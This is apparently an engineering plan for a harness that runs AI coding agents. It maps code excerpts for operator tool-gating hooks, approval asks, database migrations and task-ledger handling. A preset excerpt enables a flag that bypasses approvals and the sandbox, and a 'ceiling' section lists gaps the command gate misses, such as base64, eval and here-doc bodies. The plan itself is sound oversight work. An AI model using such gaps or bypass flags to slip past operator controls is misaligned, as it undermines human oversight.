    // renderer round-trip → can't hit the shim timeout). Slow human APPROVAL is
    // deliberately left to Claude's native permission prompt.
    if (event === 'PreToolUse' && agentId && this.control) {
      const d = this.control.toolDecision(agentId, p.tool_name ?? '');
      if (d.deny) {
        this.emitControl(agentId, p.tool_name, d.reason);
        this.emit(agentId, event, p);
        return {
          hookSpecificOutput: {
            hookEventName: 'PreToolUse',
            permissionDecision: 'deny',
            permissionDecisionReason: d.reason ?? 'Denied by operator.'
          }
        };
      }
    }
```

**The renderer channel GATE-05 already has** — `hooks.ts:1521-1523`, already named `approvalRequest`:

```ts
  /** Tell the renderer a tool call was gated/denied (#7C.1) so it can surface it
   *  (toast / control strip) — distinct from the avatar hook stream. */
  private emitControl(agentId: string, tool: string | undefined, reason: string | undefined): void {
    this.getWebContents()?.send('control:approvalRequest', { agentId, tool, reason });
  }
```

### `src/main/control.ts` — GATE-03/GATE-05 (D-01, ONE owner)

The whole function to widen, `control.ts:96-104`. Its return type `{ deny: boolean; reason?: string }`
is the thing GATE-05 needs a third member of; every other read on this class
(`shouldHalt`, `isAutoDeliveryPaused`, `takeSteer`) is the sibling style to match:

```ts
  /** Whether a tool call should be denied (paused agent, or this tool gated). */
  toolDecision(id: string, tool: string): { deny: boolean; reason?: string } {
    const c = this.map.get(id);
    if (!c) return { deny: false };
    if (c.paused) return { deny: true, reason: 'Paused by operator — resume from the floor to continue.' };
    if (tool && c.gatedTools.has(tool)) return { deny: true, reason: `Tool ${tool} is gated by the operator.` };
    return { deny: false };
  }
```

`forget(id)` at `control.ts:87` is the pattern `approvals.ts` must be wired into from `teardownPty`:

```ts
  /** Drop ALL control state for an id (called from teardownPty, beside
   *  `breaker.forget`). Ids are reused: a model change / Restart & Continue does
   *  kill()+spawn() under the same agent id ... */
  forget(id: string): void { this.map.delete(id); }
```

### `src/main/hiveTemplates.ts` — GATE-05 shim poll (+ VIGIL-04's `TASK_CLI`)

**The three reply-reading shims all share this tail** (`HOOK_SHIM`, `hiveTemplates.ts:340-347`). The
poll loop replaces exactly this block; the `c.on('error', () => process.exit(0))` line is D-08 clause 3
and **must not move**:

```js
  let resp = '';
  const done = (code) => { if (resp) process.stdout.write(resp); process.exit(code); };
  const c = net.createConnection(sock, () => c.write(JSON.stringify(payload) + '\\n'));
  c.setEncoding('utf8');
  c.on('data', (d) => { resp += d; });
  c.on('end', () => done(0));
  c.on('error', () => process.exit(0));
  setTimeout(() => process.exit(0), 5000).unref();
```

The token line every new poll connection must re-send (`hiveTemplates.ts:311-314`):

```js
  // The socket authenticates on possession of this value (hooks.ts authorized()).
  // Without it EVERY hook is rejected and the whole floor goes quiet — no status,
  // no cost, no idle detection. Set it from the env main puts on the agent PTY.
  payload.sock_token = process.env.HIVE_SOCK_TOKEN || '';
```

**The LIVE-UNVERIFIED marker style to copy** when marking pi/OpenCode (`hiveTemplates.ts:291-297`) —
prose naming the open question and why it cannot be settled, not a bare tag:

```ts
// Also consumed by codex (installCodexHooks) and, as of PARITY-01a, kimi
// (installKimiConfig) — both reuse this shim VERBATIM because their hook
// payload/response contracts are already Claude-shaped. LIVE-UNVERIFIED for
// kimi specifically: RESEARCH §6.2 records that Moonshot documents a hook
// BLOCK as exit code 2, where this shim (like Claude/codex) expresses a deny
// through stdout JSON at exit 0 — that exit-code question is open and cannot
// be settled without a live kimi session.
```

### `src/main/webhook.ts` — GATE-05 (D-10)

The interface that gains `kind` (`webhook.ts:109-117`). **L-12: keep the wire field named `taskId`** —
`resources/phone/sw.js` is installed on operators' phones:

```ts
/** One open human-feedback ask, shaped for the phone's "ASK ME" screen
 *  (UI-SPEC S5 screen 1). Newest first. */
export interface PhoneAsk {
  taskId: string;
  title: string;
  question: string;
  agent?: string;
  askedAt?: string;
}
```

The two injected thunks (`webhook.ts:146-152`) — `answerAsk`'s first arg widens to an ask id, and the
"absent or throwing → empty, never a 500" rule is the contract to preserve:

```ts
  /** The floor's currently open human-feedback asks, for `GET /phone/api/asks`.
   *  Injected so no `hive` type ever has to enter this transport file. Absent
   *  or throwing → an empty list, never a 500. */
  openAsks?: () => PhoneAsk[];
  /** Answer one open ask from the phone. Returns false on any failure so the
   *  caller can report honestly (the draft stays, the button re-enables). */
  answerAsk?: (taskId: string, answer: string) => boolean;
```

The handler that consumes them (`webhook.ts:633-641`) — no new endpoint is needed:

```ts
  /** GET /phone/api/asks — the floor's open human-feedback asks, newest
   *  first (UI-SPEC S5 screen 1). Absent/throwing `openAsks` → an empty list,
   *  never a 500. */
  private handlePhoneAsks(req: IncomingMessage, res: ServerResponse): void {
    if (!this.phoneAuthGate(req, res)) return;
    let asks: PhoneAsk[] = [];
    try { asks = this.openAsksFn ? this.openAsksFn() : []; } catch { asks = []; }
    json(res, 200, { ok: true, asks });
  }
```

**⚠️ `PHONE_TASK_ID_RE` at `webhook.ts:670`** charset-restricts the id BEFORE `answerAsk` is called —
an `askId` minted by `randomBytes(...).toString('hex')` passes; a base64url one may not. The plan must
pick an id alphabet this regex already admits, or widen it deliberately:

```ts
      if (!PHONE_TASK_ID_RE.test(taskId) || !answer) {
        json(res, 400, { ok: false, error: 'bad request' }); return;
      }
```

### `src/main/index.ts` — GATE-05 merge (`:1221-1236`)

The function that merges (`index.ts:1219-1236`). It is card-derived; the tool-approval registry merges
into its returned array behind the `kind` discriminator, and the newest-first sort is preserved:

```ts
/** `GET /phone/api/asks`' data source (UI-SPEC S5 screen 1) — every card
 *  blocked on an open human question, newest first. */
function openPhoneAsks(): PhoneAsk[] {
  const ledger = hive.tasks() as { tasks?: HiveTask[] };
  const tasks = Array.isArray(ledger?.tasks) ? ledger.tasks : [];
  const asks: PhoneAsk[] = [];
  for (const t of tasks) {
    if (t.status !== 'blocked') continue;
    const open = openAskOf(t);
    if (!open) continue;
    const ask: PhoneAsk = { taskId: t.id, title: t.title, question: open.q };
    if (t.assignee) ask.agent = t.assignee;
    if (open.askedAt) ask.askedAt = open.askedAt;
    asks.push(ask);
  }
  asks.sort((a, b) => (b.askedAt ?? '').localeCompare(a.askedAt ?? ''));
  return asks;
}
```

The wiring, unchanged in shape (`index.ts:1315-1323`):

```ts
  const server = new WebhookServer({
    port: cfg.webhookPort && cfg.webhookPort > 0 ? cfg.webhookPort : WEBHOOK_DEFAULT_PORT,
    endpoints: enabledWebhookEndpoints(),
    onMessage: handleWebhookMessage,
    lookupStatus: lookupWebhookStatus,
    staticRoot: () => phoneRootPath(),
    openAsks: () => openPhoneAsks(),
    answerAsk: (taskId, answer) => answerPhoneAsk(taskId, answer)
  });
```

### `src/main/pty.ts` — GATE-02 (`:751`) and VIGIL-03 (`:826`)

The one line GATE-02 replaces, with the ordering comments that must survive (`pty.ts:745-752`, then
`:772-776`):

```ts
      const proc = pty.spawn(file, spawnArgs, {
        name: 'xterm-256color',
        cols: opts.cols ?? 100,
        rows: opts.rows ?? 30,
        cwd: opts.cwd,
        env: {
          ...process.env,
          PATH: userPath,
```

```ts
          // Per-agent hive identity (AGENT_ID, HIVE_ROOT, …) when provided.
          ...(opts.env ?? {}),
          // LAST, so nothing upstream can shadow it: this PTY's own hook token.
          ...(hookToken ? { HIVE_SOCK_TOKEN: hookToken } : {}),
```

The tap VIGIL-03's detector hangs off (`pty.ts:826-840`) — note `session.tail` is the 256 KiB main-side
ring that fills whether or not a renderer is attached, i.e. the poll alternative is free:

```ts
      proc.onData((data) => {
        // Drop trailing output from a process whose id was already reclaimed by
        // a respawn (or killed) — it would corrupt the new session's screen.
        if (this.sessions.get(opts.id) !== session) return;
        session.hasOutput = true;
        session.lastOutputAt = Date.now();
        // Record BEFORE routing — the whole point of the tail is the window where
        // the renderer is gone (reload / late attach) and safeSend drops the chunk.
        session.tail.push(data);
        session.tailBytes += Buffer.byteLength(data);
        while (session.tailBytes > TAIL_CAP_BYTES && session.tail.length > 1) {
          session.tailBytes -= Buffer.byteLength(session.tail.shift() as string);
        }
```

and the read the poll alternative uses (`pty.ts:925-933`):

```ts
  /** This PTY's recent output (up to TAIL_CAP_BYTES), oldest→newest, or '' when
   *  there is no such PTY. ... Read-only — replaying does not
   *  consume it, so two windows attaching to the same PTY both get the screen. */
  outputTail(id: string): string {
    const s = this.sessions.get(id);
    return s ? s.tail.join('') : '';
  }
```

**Memoised-capture pattern for the pass-through list** — `src/main/shellEnv.ts:10-17` is the sibling
style for a process-lifetime cache with a retryable null:

```ts
let cachedPath: string | null = null;

/** script → captured output, memoised for the process lifetime. Every capture
 *  boots a full interactive login shell (rc files and all) — hundreds of ms of
 *  BLOCKING spawnSync on the main process — and shell PATH / binary locations
 *  don't change mid-session. Only successful captures are cached, so a null
 *  (shell failed / fence missing) stays retryable. */
const shellCapture = new Map<string, string>();
```

### `src/main/db.ts` — RECORD-01 + RECORD-02 (S-4: ONE owner, ONE migration)

**The append-only rule, stated in the file** (`db.ts:41-43` and again `:63-64`):

```ts
/**
 * Ordered, append-only migrations. Index N takes the DB from user_version N to
 * N+1. To evolve the schema, APPEND a new function — never edit an existing one
 * (shipped DBs have already run it).
```

**The exact shape of an existing migration entry to copy** (`db.ts:63-81` — migration index 0,
`user_version 1`; the new entry is index **2** → `user_version 3`):

```ts
const MIGRATIONS: Array<(db: Database.Database) => void> = [
  // → user_version 1 (Phase A): scalar kv + net-new command history.
  (db) => {
    db.exec(`
      CREATE TABLE IF NOT EXISTS kv (
        key        TEXT PRIMARY KEY,
        value      TEXT NOT NULL,     -- JSON-encoded
        updated_at INTEGER NOT NULL
      );
      CREATE TABLE IF NOT EXISTS command_history (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT NOT NULL,
        cwd      TEXT,
        text     TEXT NOT NULL,
        ts       INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_ch_agent_ts ON command_history(agent_id, ts DESC);
    `);
  },
```

**The migration-2 comment style to match** (`db.ts:84-98`) — an entry that argues for its own choices
and forbids a `throw`:

```ts
  // → user_version 2 (FLOOR-07): FTS5 keyword recall.
  //
  // `IF NOT EXISTS` IS accepted on CREATE VIRTUAL TABLE by the SQLite that ships
  // inside better-sqlite3 13.0.3 (3.53.4) — verified 2026-08-21 by running both
  // forms twice against the binary that actually loads here, not by reading the
  // grammar. ...
  // No `throw` in here. The quarantine path in open() is what makes a bad
  // migration survivable, and it only fires for corruption — a throw raised by a
  // migration escapes it and leaves the store permanently unopenable.
```

**The application loop the new migration runs through, unchanged** (`db.ts:147-158`):

```ts
  private migrate(db: Database.Database): void {
    const version = db.pragma('user_version', { simple: true }) as number;
    for (let i = version; i < MIGRATIONS.length; i++) {
      // Each migration + its version bump run in one transaction so a crash
      // mid-migration never leaves a half-applied schema at the wrong version.
      const run = db.transaction(() => {
        MIGRATIONS[i](db);
        db.pragma(`user_version = ${i + 1}`);
      });
      run();
    }
  }
```

**The writer/reader pair to copy for `recordToolCall`/`toolCalls`** (`db.ts:190-210`) — guard on
`this.db`, validate inputs, `clampLimit` on reads, `agent_id AS agentId` aliasing:

```ts
  /** Record one submitted prompt. Empty text or missing agent id are ignored. */
  addHistory(entry: { agentId: string; cwd?: string | null; text: string }): void {
    if (!this.db) return;
    const text = (entry.text ?? '').trim();
    if (!text || !entry.agentId) return;
    this.db.prepare('INSERT INTO command_history (agent_id, cwd, text, ts) VALUES (?, ?, ?, ?)')
      .run(entry.agentId, entry.cwd ?? null, text, Date.now());
  }

  /** Most-recent-first history, optionally scoped to one agent. */
  listHistory(agentId?: string, limit = 100): CommandHistoryRow[] {
    if (!this.db) return [];
    const lim = clampLimit(limit, 100);
    const rows = agentId
      ? this.db.prepare(
          'SELECT id, agent_id AS agentId, cwd, text, ts FROM command_history WHERE agent_id = ? ORDER BY ts DESC, id DESC LIMIT ?'
        ).all(agentId, lim)
      : ...
    return rows as CommandHistoryRow[];
  }
```

**Durability facts to write into RECORD-01's ceiling, not silently upgrade** (`db.ts:138-142`,
Pitfall 5 — `NORMAL` survives a process crash, not an OS/power loss):

```ts
  private openOnce(path: string): Database.Database {
    const db = new Database(path);
    db.pragma('journal_mode = WAL');
    db.pragma('synchronous = NORMAL');
    db.pragma('busy_timeout = 5000');
    db.pragma('foreign_keys = ON');
    this.migrate(db);
    return db;
  }
```

**The test-friendly constructor** (`db.ts:112-113`) — this is why `test/record-persist.test.cjs` can
avoid electron entirely:

```ts
  /** @param dbPath  Override the DB location (tests). Defaults to userData/harness.db. */
  constructor(private dbPath?: string) {}
```

### `src/main/hive.ts` — RECORD-02 (`:2485`), RECORD-05 (`:782-792`), VIGIL-04 (`:119-152`, `:2141+`)

**The mirror point** (`hive.ts:2485-2509`). RECORD-02 adds a best-effort `persist.appendEvent(...)`
beside `appendFileSync`, INSIDE the existing `try` — the rotate stays:

```ts
  appendLog(event: Record<string, unknown>): void {
    const root = this.root();
    if (!root) return;
    const path = join(root, 'log.jsonl');
    const line = JSON.stringify({ ts: Date.now(), ...event }) + '\n';
    try {
      if (this.logBytes < 0) {
        try { this.logBytes = statSync(path).size; } catch { this.logBytes = 0; }
      }
      // Rotate, ONE generation deep. The log is append-only, has never been
      // rotated, and is read by logTail — an unbounded file is an unbounded read
      // and (until the ignore seed above) an unbounded repo. Renaming over the
      // previous generation keeps recent history without a retention policy.
      if (this.logBytes >= LOG_ROTATE_BYTES) {
        ...
        try { renameSync(path, `${path}.1`); } catch { /* keep appending */ }
        this.logBytes = 0;
      }
      appendFileSync(path, line, 'utf8');
      this.logBytes += Buffer.byteLength(line);
    } catch { /* noop */ }
  }
```

**The ignore seed RECORD-05 adds `'restore.git/'` to** (`hive.ts:782-796`) — note the `want`/`missing`
idempotent-append idiom, and the `backups/` entry that names D-21's collision:

```ts
    const gitignore = join(root, '.gitignore');
    const want = [
      'fleet.json', 'hooks.sock', 'cost-ledger.jsonl', '.DS_Store',
      // Append-only event log + its one rotated generation.
      'log.jsonl', 'log.jsonl.1',
      // reflect.ts copies EVERY agent's memory.md in here on every condense
      // attempt, successful or not.
      'backups/',
      // atomicWriteJson's staging files. Transient, but a crash mid-write leaves
      // one behind and `git add -A` would commit the corpse.
      '*.tmp-*'
    ];
    let lines: string[] = [];
    if (existsSync(gitignore)) { try { lines = readFileSync(gitignore, 'utf8').split('\n'); } catch { lines = []; } }
    const missing = want.filter((w) => !lines.includes(w));
    if (missing.length) writeFileSync(gitignore, [...lines.filter(Boolean), ...missing].join('\n') + '\n', 'utf8');
```

and the matching `UNTRACK_PATHS` entry (`gitCommitter.ts:79-82`) — the comment explains why BOTH edits
are required:

```ts
/** Paths the hive repo must stop VERSIONING — see untrackIgnored(). Mirrors the
 *  churny half of the .gitignore seed in ensureHive; a `.gitignore` line alone
 *  does nothing to a file git is already tracking. */
const UNTRACK_PATHS = ['cost-ledger.jsonl', 'log.jsonl', 'log.jsonl.1', 'backups'];
```

**The optional-ISO-string convention `updatedAt` must match** (`hive.ts:110-127`) — three precedents in
one place:

```ts
/** One question→answer exchange with the human, recorded ON the task card so
 *  the decision trail stays with the work it unblocked. */
export interface HumanQA {
  q: string;
  a?: string;
  askedAt?: string;
  answeredAt?: string;
  dismissedAt?: string;
}

export interface HiveTask {
  id: string;
  title: string;
  description?: string;
  assignee?: string;
  status: 'todo' | 'doing' | 'blocked' | 'done';
  dependsOn: string[];
  priority: number;
  createdAt: string;
```

**The CAS write path every stamp must ride** (`hive.ts:2112-2126`) — `writeTasks` with `expectedRev`;
the comment names the exact bug an unstamped blind write caused:

```ts
  writeTasks(tasks: HiveTask[], expectedRev?: number): boolean {
    const root = this.root();
    if (!root) return false;
    this.ensureHive();
    const current = this.ledger();
    if (typeof expectedRev === 'number' && expectedRev !== current.rev) {
      this.appendLog({ kind: 'tasks-conflict', expectedRev, rev: current.rev });
      return false;
    }
    const next: TaskLedger = { tasks: tasks.map(stripDerivedTaskFields), rev: current.rev + 1, updatedAt: new Date().toISOString() };
    this.writeJson(join(root, 'tasks.json'), next);
    this.appendLog({ kind: 'tasks', count: tasks.length, rev: next.rev });
    this.commit(`hive: tasks (${tasks.length})`);
    return true;
  }
```

**⚠️ The second writer VIGIL-04 must also stamp** (`hive.ts:2141`, `:2154`, `:2161`, `:2173`) — a
`TASK_CLI`-only stamp leaves every UI/webhook/Slack edit unstamped:

```ts
  private mutateTasks(fn: (tasks: HiveTask[]) => HiveTask[] | null): boolean {
```
```ts
  addTask(task: HiveTask): boolean {
    return this.mutateTasks((tasks) =>
```
```ts
  patchTask(id: string, patch: Partial<Omit<HiveTask, 'id'>>): boolean {
```

The sanctioned-writer file itself is `hiveTemplates.ts:24` (`TASK_CLI`), written from
`hive.ts:804-807`:

```ts
    // The one-card ledger CLI (#17). Agents mutate tasks.json THROUGH this, under
    // compare-and-swap, instead of rewriting the whole file with their Write tool
    // and erasing whatever landed while they were composing.
    this.writeIfChanged(join(root, 'bin', 'task.cjs'), TASK_CLI);
```

### `src/main/delivery.ts` — VIGIL-03 (S-6: guard first, detector second)

**The interface that gains `blocked`** (`delivery.ts:67-79`) — copy the per-field doc-comment style;
`lastOutputAt`'s comment is the model for explaining why a field exists at all:

```ts
/** One live agent + its PTY, as the loop needs to see it. */
export interface LiveAgentPty {
  agentId: string;
  ptyId: string;
  provider: AgentProvider;
  /** True once the TUI has painted at least one frame (never type before this). */
  hasOutput: boolean;
  /** Milliseconds since this PTY last emitted a byte (ptyManager.idleFor). */
  idleMs: number;
  /** Epoch ms of this PTY's last byte, RAW — `0` means it has never emitted.
   *  `idleMs` cannot express that: a never-painted PTY and one quiet for an hour
   *  both read as "a long time", and the quiesce backstop must not flip the first. */
  lastOutputAt: number;
}
```

**The two lines the guard goes before** (`delivery.ts:739-740`, plus the emit at `:752`). Use
`delete`-then-`continue`, matching the `!quiet` arm two lines above:

```ts
      this.quiesced.add(a.agentId);
      this.deps.setStatus?.(a.agentId, 'idle');
```

The comment block that says this is the durable half (`delivery.ts:705-711`) — the sentence a plan
must not contradict:

```ts
   * The two announcements mirror the Stop drain's split: `setStatus` is the
   * durable half (index.ts writes the hive log, which does not need a window) and
   * `emit` is the live half (a documented no-op when no webContents exists).
```

### `src/main/floor/lifecycle.ts` — VIGIL-02

**The insertion point** (`lifecycle.ts:222-234`). Release the card immediately after `setArchived`,
inside the same `if (agentId)` block, with the same per-step `try {} catch` best-effort discipline:

```ts
export function teardownPty(id: string, deps: AgentTeardownDeps): void {
  try { deps.integrationBroker.revoke(id); } catch { /* best-effort */ }
  const agentId = deps.ptyToAgent.get(id);
  if (agentId) {
    deps.ptyToAgent.delete(id);
    try { deps.breaker.forget(agentId); } catch { /* best-effort */ }
    try { deps.control.forget(agentId); } catch { /* best-effort */ }
    try { deps.telemetry.forget(agentId); } catch { /* best-effort */ }
    try { deps.hive.stopProxyBridge(agentId); } catch (e) { console.error('[hive] stopProxyBridge failed:', e); }
    if (deps.hive.enabled()) {
      try { deps.hive.setArchived(agentId, true); } catch (e) { console.error('[hive] setArchived failed:', e); }
    }
  }
```

**L-09's async problem, in the file** (`lifecycle.ts:196-213` + the `void` at `:247`) — the branch
detail is NOT available in the teardown tick, and the `catch` already swallows, which is why option (a)
(release now, enrich later) is the ADR-0003-shaped choice:

```ts
export async function finalizeAgentWorktree(
  id: string, wtPath: string, origCwd: string, baseBranch: string
): Promise<void> {
  try {
    const work = await worktreeHasUnintegratedWork(wtPath, baseBranch);
    if (work.keep) {
      console.warn(
        `[worktree] PRESERVING ${id}'s worktree — it holds unintegrated work: ${wtPath} `
        + `(branch ${work.branch}, ${work.detail}). Restarting this agent re-enters it; `
        + `once the work has landed, remove it with: git -C "${origCwd}" worktree remove "${wtPath}"`
      );
      return;
    }
    ...
  } catch (e) {
    console.error('[worktree] finalizeAgentWorktree threw (worktree left in place):', e);
  }
}
```

```ts
      void finalizeAgentWorktree(id, wtPath, origCwd, baseBranch);
```

### `src/shared/agentProvider.ts` + `src/main/config.ts` + `src/renderer/src/store/config.ts` — GATE-04

**The preset field to change and the comment that must be rewritten with it**
(`agentProvider.ts:262-272` — the comment currently *argues for* the bypass; changing the flag without
rewriting it ships a file that contradicts itself):

```ts
    // Full claude-parity auto mode: skip ALL approval prompts AND drop the sandbox,
    // exactly like Claude's `bypassPermissions` / agy's `--dangerously-skip-permissions`.
    // The earlier `-a never -s workspace-write` confined writes to the PTY cwd
    // (the user's project), but a hive worker must also write to its agent folder
    // at <harnessHome>/hive/agents/<id>/ (inbox→.done, memory.md, outbox JSON,
    // deliverables) — a DIFFERENT path tree from cwd, which workspace-write blocked,
    // so codex workers couldn't do HIVE PROTOCOL housekeeping. ...
    autoModeFlag: '--dangerously-bypass-approvals-and-sandbox',
    autoFlag: '--dangerously-bypass-approvals-and-sandbox',
```

**L-08 — splice site 1, main** (`config.ts:1058-1069`):

```ts
export function commandForAutoMode(
  config: HarnessConfig,
  provider?: AgentProvider
): string {
  const p = provider ?? inferAgentProvider(config.defaultCommand);
  const base = p === 'claude' || p === 'custom'
    ? config.defaultCommand
    : defaultCommandForProvider(p, config.defaultCommand);
  if (!config.autoMode) return base;
  const flag = autoModeFlagForProvider(p);
  return flag ? `${base} ${flag}` : base;
}
```

**L-08 — splice site 2, renderer** (`renderer/src/store/config.ts:427-430`). Different tsconfig
project, so typecheck will NOT catch drift between the two:

```ts
  // Auto (skip-permissions) mode appends each provider's own flag — Claude's
  // bypassPermissions, Codex's dangerous bypass, Grok's always-approve, Kimi's
  // auto, or agy's skip flag.
  if (config.autoMode && preset.autoFlag) cmd = `${cmd} ${preset.autoFlag}`;
```

**The mutual-exclusivity pin already guarding this table** — `agentProvider.ts:64-69` names
`test/engine-parity.test.cjs` as the test that goes red on a bad preset edit:

```ts
 *  plan 02-07 — `test/engine-parity.test.cjs` pins both the mutual-exclusivity
 *  (no preset sets both `bridge` and `hookBridge`) and the declaration-matches-
 *  wiring invariant (`costTracking === 'proxy'` iff `bridgeOf(p)?.kind ===
 *  'proxy'`) so a future edit that tries this anyway goes red instead of
 *  silently deleting a mail path. */
```

### `src/renderer/src/hooks/usePtyParser.ts` + `useHive.ts` + `TasksKanban.tsx` — VIGIL-03 / VIGIL-04

**The list that moves to a shared electron-free module** (`usePtyParser.ts:26-38`) — the "do NOT match
the bare word permission" comment is the inherited knowledge that must travel with it:

```ts
// "Blocked" = Claude is genuinely waiting on the user. Match only real prompts
// (the approval menu / a yes-no question). Do NOT match the bare word
// "permission": the TUI footer always shows "bypass permissions on (shift+tab
// to cycle)", which would otherwise flag a busy agent as blocked on every
// repaint — making it flip-flop between working and blocked.
const BLOCK_HINTS = [
  /Do you want to proceed/i,
  /❯\s*\d+\.\s*Yes/i,            // numbered approval menu, cursor on "1. Yes"
  /Yes, and don't ask again/i,
  /\(y\/n\)/i,
  /\[y\/n\]/i,
];
```

and its evaluation window (`usePtyParser.ts:157-158`) — the 400-char slice is part of the behaviour:

```ts
    const recent = text.slice(-400);
    if (BLOCK_HINTS.some(re => re.test(recent))) {
```

**The already-shipped guard that becomes reachable** (`useHive.ts:156-172`) — a pure exported decision
function; VIGIL-03's plan should not need to touch it:

```ts
export function stopArmDecision(
  self: Pick<Agent, 'status'> | undefined,
  e: { blocked?: boolean; synthesized?: boolean },
  breakerArmed = false
): StopArmOutcome {
  // A blocked Stop means the agent is being re-engaged to process its inbox —
  // it's NOT idle, so keep it working until it genuinely stops. Breaker
  // precedence (#5C) is unchanged: a constrained/stopped agent stays 'looping'.
  if (e.blocked) {
    return breakerArmed
      ? { patch: null, clearBreaker: false }
      : { patch: { status: 'working', action: 'reading inbox', carrying: undefined }, clearBreaker: false };
  }
  if (e.synthesized && self?.status === 'blocked') return { patch: null, clearBreaker: false };
  // A genuine stop clears any breaker override — the run is over.
  return { patch: { status: 'idle', action: 'idle', carrying: undefined }, clearBreaker: true };
}
```

**The defensive-parse pattern `updatedAt` must join** (`TasksKanban.tsx:92-105`) — a `typeof x ===
'string' ? x : undefined` per field, with a fallback for the required one:

```ts
      createdAt: typeof t.createdAt === 'string' ? t.createdAt : new Date().toISOString(),
      humanQA: Array.isArray(t.humanQA)
        ? (t.humanQA as unknown[])
          .filter((e): e is Record<string, unknown> => !!e && typeof e === 'object' && typeof (e as { q?: unknown }).q === 'string')
          .map((e) => ({
            q: e.q as string,
            a: typeof e.a === 'string' ? e.a : undefined,
            askedAt: typeof e.askedAt === 'string' ? e.askedAt : undefined,
            answeredAt: typeof e.answeredAt === 'string' ? e.answeredAt : undefined,
            // Preserve a dismissal across the 5s re-parse, else the card would
            // resurface on the next poll (openQuestion would see it as open).
            dismissedAt: typeof e.dismissedAt === 'string' ? e.dismissedAt : undefined
          }))
        : undefined
```

and the re-declaration convention it lives under (`TasksKanban.tsx:9-11`) — the renderer mirrors
`HiveTask` locally rather than importing from main, so **`updatedAt` must be added in BOTH places**:

```tsx
/** A card on the task kanban. Mirrors HiveTask in the main/preload process —
 *  re-declared locally so the renderer doesn't reach into the preload package
 *  (same convention as store/config.ts). */
```

### `src/main/telemetry.ts` — RECORD-01 (NO SOURCE CHANGE RECOMMENDED)

`ToolSpan` at `telemetry.ts:95-107` is the measured reason D-17's literal reading fails (L-05) —
**there is no `target` field and there never was.** Quote this in the plan as the justification for
hanging RECORD-01 off the hook socket instead, and leave the ring alone:

```ts
/** A single tool invocation, for the per-agent span waterfall. Ephemeral — kept
 *  only in the in-memory ring buffer, never persisted. */
export interface ToolSpan {
  agentId: string;
  sessionId: string;
  ts: number;
  tool: string;
  success: boolean;
  durationMs: number;
  decision?: 'accept' | 'reject';
  error?: string;
}
```

```ts
const SPAN_RING_CAP = 200; // rich spans retained per agent for the waterfall.
```

---

## Shared Patterns

### 1. Injected dependencies over imports — HOUSE LAW

**Source:** `src/main/floor/deps.ts:1-25` (the canonical statement) — every new collaborator in this
phase arrives as an injected thunk, or it cannot be unit-tested on the three CI platforms.
**Apply to:** `commandShape.ts` (config allowlist reader), `approvals.ts` (clock, notify, emit),
`restorePoints.ts` (root thunk, log, clock), the watchdog (every read + all three alarm channels).

```ts
/**
 * FloorDeps — the whole Electron surface `bootFloor` (boot.ts) is allowed to
 * touch, modelled on `DeliveryDeps` (delivery.ts:94-162): plain functions, each
 * carrying a comment for WHY it is injected and what degrades if it is not.
 *
 * Deliberately free of any `electron` import so `node --test` can construct and
 * tear down a whole floor with fakes (test/boot-floor.test.cjs). Everything
 * Electron-shaped — app.getPath, safeStorage, Notification, a live webContents,
 * app.quit, BrowserWindow focus/power-save — arrives through this interface,
 * wired at index.ts's `electronDeps()`.
 *
 * Types and nothing else: no construction, no subsystem import, no default
 * export, no barrel.
 */
export interface FloorDeps {
  /**
   * Electron's per-purpose filesystem roots (app.getPath('userData'/'logs'),
   * app.getAppPath()). A THUNK, not a value captured once — `index.ts` used to
   * build these paths at module scope, where they were legitimately unusable
   * before Electron's 'ready' event ... Injected so a test can point every
   * root at one tmpdir.
   */
  paths: () => { userData: string; logs: string; appPath: string };
```

**Second exemplar, for a leaf module with a network/IO edge** — `src/main/push.ts:6-16`:

```ts
 * Deliberately free of any `electron` import so `node --test` can drive every
 * case with fakes (test/push-vapid.test.cjs) and no real network reach. The
 * outbound HTTP call is an INJECTED `transport` (D-15's rule, applied here) —
 * no module in this file ever calls `fetch`/`https.request` itself.
```

```ts
/** Mirrors `AccountPoolDeps` (`accountPool.ts:57-74`): `statePath` is a
 *  GETTER because this is constructed before Electron's `app` paths are
 *  usable. */
export interface PushDeps {
  statePath: () => string;
}
```

### 2. The written ceiling list (D-34) — part of the deliverable

**Source:** `src/main/hooks.ts:801-859` (excerpted in full under `commandShape.ts` above).
**Apply to:** GATE-02 (`pty.ts` env allowlist), GATE-03 (`commandShape.ts`), GATE-05
(`approvals.ts`). Non-negotiable elements: a `THE CEILING` heading, `WHAT IT NOW IS` /
`WHAT IT STILL DOES NOT REACH`, lettered items, at least one **accepted fail-open with a named owner**,
and the self-enforcing closing sentence (`hooks.ts:848`):

```
   * A ceiling list that omits (b), (f) or (g) reads as a guarantee
   * that does not hold.
```

D-04's minimum new items for GATE-03: runtime-assembled command strings, `cd`-then-relative
invocation, a harness home containing a space. RESEARCH adds (m) base64/`eval`/here-doc bodies,
(n) non-Bash tools, (o) the seven engines reached and the four not.

### 3. Both-directions repo-fact assertions (D-33 / Phase 2's D-40)

**Source:** `test/repo-claims.test.cjs:1415-1454`. The model is three assertions per claim, not one:
a **file-set** deepEqual, an **exact total**, and a **per-engine positive lower bound**.
**Apply to:** every repo-fact clause GATE-02/03/04/05 adds.

```js
  assert.deepEqual(
    filesWithMarkers.slice().sort(),
    Object.keys(MARKER_LEDGER).slice().sort(),
    `the files actually carrying a LIVE-UNVERIFIED marker (${filesWithMarkers.sort().join(', ')}) `
    + `do not match MARKER_LEDGER's keys (${Object.keys(MARKER_LEDGER).sort().join(', ')}). A `
    + 'marker moved to a file this ledger does not name.'
  );
```

```js
  // Per-engine: which of the five is named inside each marker's own comment
  // block, attributed structurally (never by character count). A total
  // alone is satisfied by unmarking crush and adding a marker elsewhere —
  // this is the positive half that catches exactly that.
  ...
  for (const engine of LIVE_UNVERIFIED_ENGINES) {
    assert.ok(
      engineCounts[engine] >= 1,
      `${engine} has ${engineCounts[engine]} attributed LIVE-UNVERIFIED marker(s), expected >= 1. `
```

The raw-vs-stripped read rule (`test/repo-claims.test.cjs:1251-1259`) — a plan adding a
comment-resident assertion MUST use `readRaw`, not `readStripped`:

```js
// THIS CLAUSE IS THE FILE'S ONE DELIBERATE EXCEPTION TO COMMENT-STRIPPING.
// `LIVE-UNVERIFIED` lives INSIDE comments — every marker below is a comment
// line, by construction (it is how a bridge is marked as unverified) — so a
// `readStripped` read would delete every single one and this clause would
// count zero forever, passing green against any ledger whatsoever (D-40).
```

### 4. Electron-free main modules, and the loader that proves it

**Source:** `test/load-ts.cjs:9-45`. Read this before writing any new test — it explains the electron
